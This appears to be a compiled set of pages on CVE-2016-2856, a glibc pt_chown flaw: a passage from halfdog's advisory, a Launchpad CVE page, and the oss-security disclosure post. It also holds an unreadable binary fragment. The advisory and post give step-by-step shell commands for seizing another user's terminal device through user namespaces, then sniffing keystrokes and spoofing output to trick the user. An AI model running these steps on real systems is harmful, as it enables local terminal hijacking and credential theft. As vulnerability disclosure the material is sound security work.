crw------- 1 test users 136, 0 Dec 27 12:53 0
crw-rw-rw- 1 test users 5, 2 Dec 27 12:48 ptmx
test# ls -al /dev/pts/0
crw--w---- 1 root tty 136, 1 Dec 27 2015 /dev/pts/0
test# /usr/lib/pt\_chown
test# ls -al /dev/pts/0
crw--w---- 1 test tty 136, 1 Dec 27 12:50 /dev/pts/0

On systems where the *TIOCSTI-ioctl* is not prohibited,
the tools from [TtyPushbackPrivilegeEscalation](/Security/2012/TtyPushbackPrivilegeEscalation/)
to directly inject code into a shell using the pts device. This
is not the case at least on Ubuntu Wily. But as reading and writing
to the *pts* is allowed, the malicious user can not intercept
all keystrokes and display faked output from commands never really
executed. Thus he could lure the user into a) change his password
or attempt to invoke su/sudo or b) simulate a situation, where
user's next step is predictable and risky and then stop reading
the pts, thus making user to execute a command in completely unexpected
way.

# Results, Discussion

As already mentioned in
[OverlayfsOverFusePrivilegeEscalation](../../2016/OverlayfsOverFusePrivilegeEscalation/),
exposure of essential OS functionality, previously just invoked
by really privileged processes, to now unprivileged users via
user namespaces greatly increases the attack surface and thus
is a very interesting target for exploit development.

While glibc-2.18 already dropped default *pt\_chown* compiling,
switch *--enable-pt\_chown* is now needed (see this [post](http://openwall.com/lists/oss-security/2016/02/23/7)),
some distros may have still the need to keep this piece of software.
In my opinion, on those systems that bug should be fixed two-fold:
At first, kernel should prevent the *TIOCGPTN* ioctl when
invoked called by a process within one namespace but acting on
a filedescriptor from a devpts instance mounted in a different
namespace. Additionally *pt\_chown* should check via readlink
and stat, that the passed file descriptor really was from the
*/dev/ptmx* or */dev/pts/ptmx* device present in the
same namespace as the */dev/pts/[num]* device is residing.
This of course is only relevant if *pt\_chown* is going to
survive on recent namespace aware systems.

# Timeline

* 20151220: Discovery
* 20151227: Report at Ubuntu Launchpad[1529486](https://bugs.launchpad.net/ubuntu/%2Bsource/glibc/%2Bbug/1529486)
* 20160104: Report to distros list
* 20160119: Asking for coordination, to disable USERNS for time being ([post](http://www.openwall.com/lists/oss-security/2016/01/19/17))
* 20160122: Patch to disable unprivileged userns due to this and other issues [LKML](https://lkml.org/lkml/2016/1/22/7)
* 20160222: CRD and publication
# Material, References

* [CVE-2016-2856](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2856)

Last modified 20171228
Contact e-mail: me (%) halfdog.net



=== Content from assets.ubuntu.com_9a4aab3c_20250126_032424.html ===
!�   ������l��Ж���M��=�z���`" ��mQ�G9�A�nc;�Nj�8��a�%���v���=�xT\n��Q�=��������<]7��ss���`<�]7��k����Ϻ�;t���Ǥ�զ{��c[ gy��H�b���6��d��f~ݴ��u��$�\_t/p�zݍ���I����9��yI�$T�+<R-Q�sR,Y�ap�^��I!��������#��W�D���ZIa-�&d���Ţ�$��k�Z�φ��MJR,┩�#��,IP���`B� cN��=�WSO���n�U��\*GQ`t�Ȯ��#a�>�����l6fx�а0��R���\���$�Hd ]��K���M���7=

=== Content from launchpad.net_5010bd18_20250126_032413.html ===

[Log in / Register](https://launchpad.net/bugs/cve/CVE-2016-2856/%2Blogin)

![](/@@/launchpad-logo)

## Launchpad.net

* [Launchpad Home](https://launchpad.net/)
* [Code](https://code.launchpad.net/)
* [Bugs](https://bugs.launchpad.net/)
* [Blueprints](https://blueprints.launchpad.net/)
* [Translations](https://translations.launchpad.net/)
* [Answers](https://answers.launchpad.net/)

[Launchpad CVE tracker](/bugs/cve)
# CVE 2016-2856

pt\_chown in the glibc package before 2.19-18+deb8u4 on Debian jessie; the elibc package before 2.15-0ubuntu10.14 on Ubuntu 12.04 LTS and before 2.19-0ubuntu6.8 on Ubuntu 14.04 LTS; and the glibc package before 2.21-0ubuntu4.2 on Ubuntu 15.10 and before 2.23-0ubuntu1 on Ubuntu 16.04 LTS and 16.10 lacks a namespace check associated with file-descriptor passing, which allows local users to capture keystrokes and spoof data, and possibly gain privileges, via pts read and write operations, related to debian/sysdeps/linux.mk. NOTE: this is not considered a vulnerability in the upstream GNU C Library because the upstream documentation has a clear security recommendation against the --enable-pt\_chown option.

## Related bugs and status

CVE-2016-2856 (Candidate)
is related to these bugs:

**[Bug #1529486: pt\_chown arbitrary pts access via user namespace](https://bugs.launchpad.net/bugs/1529486)**

| Summary | | | | In | Importance | Status |
| --- | --- | --- | --- | --- | --- | --- |
|  | 1529486 | [pt\_chown arbitrary pts access via user namespace](https://bugs.launchpad.net/ubuntu/%2Bsource/glibc/%2Bbug/1529486) |  | glibc (Ubuntu) | Undecided | Fix Released |

**[Bug #1546457: libc6 2.15-0ubuntu10.13 doesn't mark reboot-required](https://bugs.launchpad.net/bugs/1546457)**

| Summary | | | | In | Importance | Status |
| --- | --- | --- | --- | --- | --- | --- |
|  | 1546457 | [libc6 2.15-0ubuntu10.13 doesn't mark reboot-required](https://bugs.launchpad.net/ubuntu/%2Bsource/glibc/%2Bbug/1546457) |  | glibc (Ubuntu) | High | Fix Released |
|  | 1546457 | [libc6 2.15-0ubuntu10.13 doesn't mark reboot-required](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/eglibc/%2Bbug/1546457) |  | eglibc (Ubuntu Precise) | High | Fix Released |
|  | 1546457 | [libc6 2.15-0ubuntu10.13 doesn't mark reboot-required](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/eglibc/%2Bbug/1546457) |  | eglibc (Ubuntu Trusty) | High | Fix Released |
|  | 1546457 | [libc6 2.15-0ubuntu10.13 doesn't mark reboot-required](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/glibc/%2Bbug/1546457) |  | glibc (Ubuntu Wily) | High | Fix Released |

See the ![](/@@/link)
[CVE page on Mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-2856)
for more details.

## Related bugs

* [#1529486:
  pt\_chown arbitrary pts access via user namespace](https://bugs.launchpad.net/bugs/1529486)
* [#1546457:
  libc6 2.15-0ubuntu10.13 doesn't mark reboot-required](https://bugs.launchpad.net/bugs/1546457)

* [Link to bug](%2Blinkbug)
* [Remove bug link](%2Bunlinkbug)

## References

* MLIST:
  [[oss-security] 2016022...](http://www.openwall.com/lists/oss-security/2016/02/23/3)
* MLIST:
  [[oss-security] 2016030...](http://www.openwall.com/lists/oss-security/2016/03/07/2)
* MISC:
  [http://www.halfdog.net...](http://www.halfdog.net/Security/2015/PtChownArbitraryPtsAccessViaUserNamespace/)
* CONFIRM:
  [http://people.canonica...](http://people.canonical.com/~ubuntu-security/cve/2016/CVE-2016-2856.html)
* UBUNTU:
  [USN-2985-1](http://www.ubuntu.com/usn/USN-2985-1)
* UBUNTU:
  [USN-2985-2](http://www.ubuntu.com/usn/USN-2985-2)
* BID:
  [84601](http://www.securityfocus.com/bid/84601)
* CONFIRM:
  [http://anonscm.debian....](http://anonscm.debian.org/cgit/pkg-glibc/glibc.git/commit/?h=jessie&amp;id=09f7764882a81e13e7b5d87d715412283a6ce403)
* CONFIRM:
  [http://anonscm.debian....](http://anonscm.debian.org/cgit/pkg-glibc/glibc.git/commit/?h=jessie&amp;id=11475c083282c1582c4dd72eecfcb2b7d308c958)

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from www.openwall.com_ac8f9d18_20250124_204517.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](4) [[thread-next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <8fc639ad-daef-1a6f-facf-140eb61aeee5@halfdog.net>
Date: Tue, 23 Feb 2016 12:03:54 +0000
From: halfdog <me@...fdog.net>
To: oss-security@...ts.openwall.com
Subject: Access to /dev/pts devices via pt_chown and user namespaces

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Sending content from [0] also to oss-security as requested last time:

Problem description:
====================

With Ubuntu Wily and earlier, /usr/lib/pt_chown was used to change
ownership of slave pts devices in /dev/pts to the same uid holding the
master file descriptor for the slave. This is done using the pt_chown
SUID binary, which invokes the ptsname function on the master-fd, thus
again performing a TIOCGPTN ioctl to get the slave pts number. Using
the result from the ioctl, the pathname of the slave pts is
constructed and chown invoked on it, see login/programs/pt_chown.c:

  pty = ptsname (PTY_FILENO);
  if (pty == NULL)
    ...
  /* Get the group ID of the special `tty' group.  */
  p = getgrnam (TTY_GROUP);
  gid = p ? p->gr_gid : getgid ();

  /* Set the owner to the real user ID, and the group to that special
     group ID.  */
  if (chown (pty, getuid (), gid) < 0)
    return FAIL_EACCES;

  /* Set the permission mode to readable and writable by the owner,
     and writable by the group.  */
  if ((st.st_mode & ACCESSPERMS) != (S_IRUSR|S_IWUSR|S_IWGRP)
      && chmod (pty, S_IRUSR|S_IWUSR|S_IWGRP) < 0)
    return FAIL_EACCES;

  return 0;

The logic above is severely flawed, when there can be more than one
master/slave pair having the same number and thus same name. But this
condition can be easily created by creating an user namespace,
mounting devpts with the newinstance option, create master and slave
pts pairs until the number overlaps with a target pts outside the
namespace on the host, where there is interest to gain ownership and
then invoke pt_chown.

Methods:
========

Exploitation is trivial: At first use any user namespace demo to
create the namespace needed, e.g. UserNamespaceExec.c and work with
standard shell commands, e.g. to take over /dev/pts/0:

test# who am I
test    pts/1        2015-12-27 12:00
test# ./UserNamespacesExec -- /bin/bash
Setting uid map in /proc/5783/uid_map
Setting gid map in /proc/5783/gid_map
euid: 0, egid: 0
euid: 0, egid: 0
root# mkdir mnt
root# mount -t devpts -o newinstance /dev/pts mnt
root# cd mnt
root# chmod 0666 ptmx

Use a second shell to continue:

test# cd /proc/5783/cwd
test# ls -al
total 4
drwxr-xr-x 2 root  root     0 Dec 27 12:48 .
drwxr-xr-x 7 test users 4096 Dec 27 11:57 ..
c--------- 1 test users 5, 2 Dec 27 12:48 ptmx
test# exec 3<>ptmx
test# ls -al
total 4
drwxr-xr-x 2 root  root       0 Dec 27 12:48 .
drwxr-xr-x 7 test users   4096 Dec 27 11:57 ..
crw------- 1 test users 136, 0 Dec 27 12:53 0
crw-rw-rw- 1 test users   5, 2 Dec 27 12:48 ptmx
test# ls -al /dev/pts/0
crw--w---- 1 root tty 136, 1 Dec 27  2015 /dev/pts/0
test# /usr/lib/pt_chown
test# ls -al /dev/pts/0
crw--w---- 1 test tty 136, 1 Dec 27 12:50 /dev/pts/0

On systems where the TIOCSTI-ioctl is not prohibited, the tools from
TtyPushbackPrivilegeEscalation to directly inject code into a shell
using the pts device. This is not the case at least on Ubuntu Wily.
But as reading and writing to the pts is allowed, the malicious user
can not intercept all keystrokes and display faked output from
commands never really executed. Thus he could lure the user into a)
change his password or attempt to invoke su/sudo or b) simulate a
situation, where user's next step is predictable and risky and then
stop reading the pts, thus making user to execute a command in
completely unexpected way.

Results, Discussion:
====================

As already mentioned in [1], exposure of essential OS functionality,
previously just invoked by really privileged processes, to now
unprivileged users via user namespaces greatly increases the attack
surface and thus is a very interesting target for exploit development.

In my opinion, this security bug should be fixed two-fold: At first,
kernel should prevent the TIOCGPTN ioctl when invoked called by a
process within one namespace but acting on a filedescriptor from a
devpts instance mounted in a different namespace. Additionally
pt_chown should check via readlink and stat, that the passed file
descriptor really was from the /dev/ptmx or /dev/pts/ptmx device
present in the same namespace as the /dev/pts/[num] device is
residing. This of course is only relevant if pt_chown is going to
survive on recent namespace aware systems.

Timeline:
=========

    20151220: Discovery
    20151227: Report at Ubuntu Launchpad1529486
    20160104: Report to distros list
    20160122: Patch to disable unprivileged userns due to this and
other issues LKML
    20160222: CRD and publication

References:
===========

[0]
<http://www.halfdog.net/Security/2015/PtChownArbitraryPtsAccessViaUserNamespace/>
[1]
<http://www.halfdog.net/Security/2016/OverlayfsOverFusePrivilegeEscalation/>

hd

- --
<http://www.halfdog.net/>
PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iEYEARECAAYFAlbMSpgACgkQxFmThv7tq+53VgCdEHpGBl00dQi23z1jEz+wG+dk
lK4AniINDh7dx9Oe6NXn5KiaFBGstw5O
=scxD
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


